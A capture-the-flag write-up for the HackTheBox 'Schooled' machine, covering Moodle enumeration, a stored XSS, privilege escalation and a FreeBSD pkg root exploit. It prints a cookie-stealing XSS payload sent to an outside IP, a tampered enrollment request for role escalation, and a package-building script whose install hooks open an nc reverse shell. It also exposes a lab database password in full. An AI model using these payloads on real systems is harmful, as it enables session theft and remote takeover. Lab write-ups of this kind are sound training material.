---
title: HackTheBox - Schooled Writeup
date: 2021-05-06 09:45:47 +07:00
categories: hackthebox
#modified: 20-08-29 09:24:47 +07:00
#tags: [blog, netlify, jekyll, github]
description: HackTheBox Schooled Writeup.
---

<p align="center">
 <img src="https://www.hackthebox.eu/storage/avatars/3e2a599fda2f510f3a5f2146fae928ee.png">
</p>


Get ready to be schooled trying this one!

*[Find the official room for Hackthebox's - Schooled here!](https://app.hackthebox.eu/machines/335)*


----------------------------------------------------------------------------------------------------

## ENUMERATION

Beginning enumeration with nmap using a default script and version scan with the verbosity on to see open ports on the fly without having to wait for the scan to finish. Ports 22,80 are found open.

![Image](https://raw.githubusercontent.com/m3rcer/m3rcer.github.io/master/_posts/ctf/HackTheBox_Schooled_Writeup/images/schooled1.png)

Scanning for all ports using nmap shows **mysql** is running on port **33060**. Trying to see if we can remotely access the database results in no access.

![Image](https://raw.githubusercontent.com/m3rcer/m3rcer.github.io/master/_posts/ctf/HackTheBox_Schooled_Writeup/images/schooled2.png)

Moving on, we begin by looking at port 80 as always.
- Looking at page source suggests for adding an entry in our hosts list. Add `schooled.htb     <corresponding IP>` to your `/etc/hosts` file and continue browsing the site. 
    - ![Image](https://raw.githubusercontent.com/m3rcer/m3rcer.github.io/master/_posts/ctf/HackTheBox_Schooled_Writeup/images/schooled3.png)
- Looking at the about us page . We discover The possble CMS used is - **Moodle**
    - ![Image](https://raw.githubusercontent.com/m3rcer/m3rcer.github.io/master/_posts/ctf/HackTheBox_Schooled_Writeup/images/schooled4.png)
- Looking at the Teachers page , we find a bunch of possible unames and roles. Add them to a `user.list` file.
    ```bash
    Jane Higgins :- Scientific Research lecturer
    Lianne Carter:- Manager and English Teacher
    Manuel Phillips:- Mathematics Teacher
    Jamie Borham:- Information Technology lecturer
    ```
- Directory bruteforcing using `gobuster` dosent result in anything too useful.
- So far info discovered:
    ```bash
    mail: admissions@schooled.htb
    From wappalyzer: Php 7.4.15, Apache2, Bootstrap 4.1.0
    ```
- Nothing seems too useful so far. No admin/login panels were found so far.
- Using `gobuster` for `vhost` bruteforcing we find: `moodle.schooled.htb`
- Add `moodle.schooled.htb` to your `/etc/hosts` list and browse to it as before.
    - ![Image](https://raw.githubusercontent.com/m3rcer/m3rcer.github.io/master/_posts/ctf/HackTheBox_Schooled_Writeup/images/schooled5.png)
- Visiting the page lets us signup without a confirmation.
- Abuse this to create an account next. While signing up the mail naming convention is name@student.schooled.htb.
- After unsuccesfull attempts to upload a payload and get rce, what is odd is that `Manuel Phillips` (teacher) was online and the owner of the maths course. A Possible XSS attack could be attempted.
- On Looking for the Moodle versions and [CVE] we find 2 major.
- Looking at the announcement section Manuel Phillips hints at the MoodleNet Profile in the user settings section. This could be used as the potential XSS avenue. 


----------------------------------------------------------------------------------------------------

## FOOTHOLD:

- Setup a `xss-server` with this [simple python script](https://github.com/lnxg33k/misc/blob/master/XSS-cookie-stealer.py). 
- Start the server. 
- Enroll in the maths course .
- Use this xss payload: `<img src=x onerror=this.src='http://10.10.14.51:8888/?'+document.cookie;>`
- Paste it in the user settings section
    - ![Image](https://raw.githubusercontent.com/m3rcer/m3rcer.github.io/master/_posts/ctf/HackTheBox_Schooled_Writeup/images/schooled6.png)
- Wait for a few seconds and recieve the teachers cookie on your `xss-server`.
    - ![Image](https://raw.githubusercontent.com/m3rcer/m3rcer.github.io/master/_posts/ctf/HackTheBox_Schooled_Writeup/images/schooled7.png)
- Copy this `cookie --> Inspect Element --> Storage --> replace MoodleSession's value to the cookie`. Refresh the pg/F5 to. You're Now Manuel Phillips (Teacher).

### PRIVILEGE ESCALATION: TEACHER --> MANAGER --> ADMIN

- A interesting site is found while searching for exploits: [moodle_priv_esc](https://moodle.org/security/index.php?o=3&p=2)
- This shows that  a privesc was possible from teacher to manager role is possible by exploiting the course enrollment functionality. 
- Looking at our `users.txt` we know that Lianne Carter is a manager and we could possibly perform the exploit with this user.
- Looking up the cve on github a POC is found: [exploit_poc](https://github.com/HoangKien1020/CVE-2020-14321)
- Steps to perform this privesc:
    - Go to the maths section as `teacher --> Participants`.
    - Click on the Enroll Users option and enroll Lianne carter. Switch on intercept in burp and intercept the passed request.
    - Send the request to repeater and change the following 2 values to match that of your current teacher(`id=24`).
    - Changed these params to match: `userlist%5B%5D=24&roletoassign=1`. (Changing user id to teachers id == 24 and changing role to admin == 1)
    - ![Image](https://raw.githubusercontent.com/m3rcer/m3rcer.github.io/master/_posts/ctf/HackTheBox_Schooled_Writeup/images/schooled8.png)
- Send the request and stop intercept after.
    - From here click on Lianne carter's profile from the below list. Note to see the difference and an Administration button appear on the side.
    - ![Image](https://raw.githubusercontent.com/m3rcer/m3rcer.github.io/master/_posts/ctf/HackTheBox_Schooled_Writeup/images/schooled9.png)
- Click on it and now we have manager privileges.
- From the POC discussed above we can add even more privileges to allow us to install a plugin of choice. To do this click on site administration from here.
- Click on `Users --> define roles`.  Click on the 'edit' icon in the manager role. Turn intercept on before you do and add the payload from the POC described. Forward the request to get admin privileges.
    - ![Image](https://raw.githubusercontent.com/m3rcer/m3rcer.github.io/master/_posts/ctf/HackTheBox_Schooled_Writeup/images/schooled10.png)
- Next grab `rce.zip` from [here](https://github.com/HoangKien1020/Moodle_RCE)
- Unzip the file. Modify `block_rce.php` file to a standard php reverse shell of your choosing. Zip back the contents using `zip -r -q lala.zip rce`
- Click on install plugin after `upload --> continue`. You will see a screen with current information. Dont go past it . Time to trigger the rce.
- Setup an `nc` listener , Open a new tab and  trigger the exploit using this link **http://moodle.schooled.htb/moodle/blocks/rce/lang/en/block_rce.php**
- We now have a shell. 


----------------------------------------------------------------------------------------------------


## POST EXPLOITATION

**user.txt:**

- Poking around and looking for config files, we find the apache and moodle data directory as `usr/local/www/apache24/data/moodle/`.
- Checking the contents of the **config.php** file in dir:
    - ![Image](https://raw.githubusercontent.com/m3rcer/m3rcer.github.io/master/_posts/ctf/HackTheBox_Schooled_Writeup/images/schooled11.jpg)
- We get database creds as *moodle:P################0* .
- Notice that mysql dosent exist in PATH. We find mysql using the basic find command: `find / -name mysql 2> /dev/null`
- Mysql is at `/usr/local/bin/mysql`.
- We perform 3 basic queries now to enumerate the database: 
    - First cd to /usr/local/bin.
- Then:
    - `mysql -u moodle -pPlaybookMaster2020 -e 'show databases;'` --> infer moodle as the db name.
    - `mysql -u moodle -pPlaybookMaster2020 -e 'use moodle; show tables;'`  --> infer mdl_user could be of interest.
    - `mysql -u moodle -pPlaybookMaster2020 -e 'use moodle; select * from mdl_user;'` --> DB creds dump. 
    - ![Image](https://raw.githubusercontent.com/m3rcer/m3rcer.github.io/master/_posts/ctf/HackTheBox_Schooled_Writeup/images/schooled12.png)
- Jamie's account here is of interest as he is one of the users on the box.
- This hash is a `bcrypt hash`.
- Use john the ripper to crack the hash:
    - ![Image](https://raw.githubusercontent.com/m3rcer/m3rcer.github.io/master/_posts/ctf/HackTheBox_Schooled_Writeup/images/schooled13.jpg)
- Jamies creds: *jamie:!#####x*
- Now ssh over with these creds.
- Grab `user.txt` from jamie's home directory.

**root.txt**

- Performing a basic `sudo -l`:
    - ![Image](https://raw.githubusercontent.com/m3rcer/m3rcer.github.io/master/_posts/ctf/HackTheBox_Schooled_Writeup/images/schooled14.png)
- Poking around the internet and doing some good research on what the command is we find that it is a distinct binary that is replaced by the bootstrapped binary during the initial installation process.
- We can use this to probably install a custom package with code modified to privilege escalate to root.
- [Refer this article](http://lastsummer.de/creating-custom-packages-on-freebsd/)
- After reading the article put it all as a single script and modify parts of it as per your host listener. Use`nc` shells as the box has netcat and bsd just wouldn't work well with regular bash shells.
- The script :
    ```bash
    #!/bin/sh
    STAGEDIR=/tmp/stage
    rm -rf ${STAGEDIR}
    mkdir -p ${STAGEDIR}
    cat >> ${STAGEDIR}/+PRE_DEINSTALL <<EOF
    # careful here, this may clobber your system
    echo "Resetting root shell"
    rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.52 9001 >/tmp/f
    EOF
    cat >> ${STAGEDIR}/+POST_INSTALL <<EOF
    # careful here, this may clobber your system
    echo "Registering root shell"
    rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.52 9001 >/tmp/f
    EOF
    cat >> ${STAGEDIR}/+MANIFEST <<EOF
    name: mypackage
    version: "1.0_5"
    origin: sysutils/mypackage
    comment: "automates stuff"
    desc: "automates tasks which can also be undone later"
    maintainer: john@doe.it
    www: https://doe.it
    prefix: /
    EOF
    echo "deps: {" >> ${STAGEDIR}/+MANIFEST
    pkg query "  %n: { version: \"%v\", origin: %o }" portlint >> ${STAGEDIR}/+MANIFEST
    pkg query "  %n: { version: \"%v\", origin: %o }" poudriere >> ${STAGEDIR}/+MANIFEST
    echo "}" >> ${STAGEDIR}/+MANIFEST
    mkdir -p ${STAGEDIR}/usr/local/etc
    echo "# hello world" > ${STAGEDIR}/usr/local/etc/my.conf
    echo "/usr/local/etc/my.conf" > ${STAGEDIR}/plist
    pkg create -m ${STAGEDIR}/ -r ${STAGEDIR}/ -p ${STAGEDIR}/plist -o .
    ```
- Save the script and make it an executable: `chmod +x script.sh`
- Execute the script and note to see a package made named: `mypackage-1.0_5.txz`
- Run : `sudo /usr/sbin/pkg install --no-repo-update mypackage-1.0_5.txz` (`--no-repo-update` to stop it from checking an online source) and start a listener.
    - ![Image](https://raw.githubusercontent.com/m3rcer/m3rcer.github.io/master/_posts/ctf/HackTheBox_Schooled_Writeup/images/schooled15.png)
    - ![Image](https://raw.githubusercontent.com/m3rcer/m3rcer.github.io/master/_posts/ctf/HackTheBox_Schooled_Writeup/images/schooled16.png)
- Grab `root.txt` from the root home directory.

--------------------------------------------------------------


